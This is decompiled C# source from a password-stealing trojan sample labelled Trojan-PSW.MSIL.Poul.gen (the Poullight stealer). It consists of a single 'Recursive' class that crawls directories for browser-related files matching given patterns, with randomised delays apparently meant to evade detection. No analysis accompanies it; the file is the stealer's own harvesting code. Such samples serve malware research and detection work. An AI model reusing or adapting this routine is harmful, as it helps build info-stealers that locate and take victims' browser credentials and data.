// Decompiled with JetBrains decompiler
// Type: Recursive
// Assembly: Poullight, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A9555FC6-4E86-4D22-9A29-AD3955B2BC52
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\Trojan-PSW.MSIL.Poul.gen-67cfa95ccaa06c437e04f38c3ef890986c1885c61636b84bf51d16b0d7bf957c.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;

internal class Recursive
{
  public static void Search(
    string path,
    ref List<string> _out,
    string[] browsers,
    string[] search_files,
    int recursive_max = -1,
    int i = 0,
    bool search = false)
  {
    if (!search && recursive_max > 0)
    {
      if (i < recursive_max)
      {
        ++i;
      }
      else
      {
        for (int index = 0; index < browsers.Length && !search; ++index)
        {
          if (path.ToLower().Contains(browsers[index].ToLower()))
            search = true;
        }
        if (!search)
          return;
      }
    }
    DirectoryInfo Info = new DirectoryInfo(path);
    DirectoryInfo[] source1 = (DirectoryInfo[]) null;
    IEnumerable<FileInfo> source2 = (IEnumerable<FileInfo>) null;
    try
    {
      source1 = Info.GetDirectories();
      source2 = ((IEnumerable<string>) search_files).SelectMany<string, FileInfo>((Func<string, IEnumerable<FileInfo>>) (ext => (IEnumerable<FileInfo>) Info.GetFiles(ext)));
    }
    catch
    {
    }
    if (source2 != null && source2.Count<FileInfo>() > 0)
    {
      foreach (FileInfo fileInfo in source2)
      {
        for (int index = 0; index < browsers.Length; ++index)
        {
          if (fileInfo.FullName.ToLower().Contains(browsers[index]))
          {
            _out.Add(fileInfo.FullName);
            break;
          }
        }
        Thread.Sleep(new Random().Next(35, 60));
      }
    }
    if (source1 == null || ((IEnumerable<DirectoryInfo>) source1).Count<DirectoryInfo>() <= 0)
      return;
    foreach (FileSystemInfo fileSystemInfo in source1)
      Recursive.Search(fileSystemInfo.FullName, ref _out, browsers, search_files, recursive_max, i, search);
  }
}
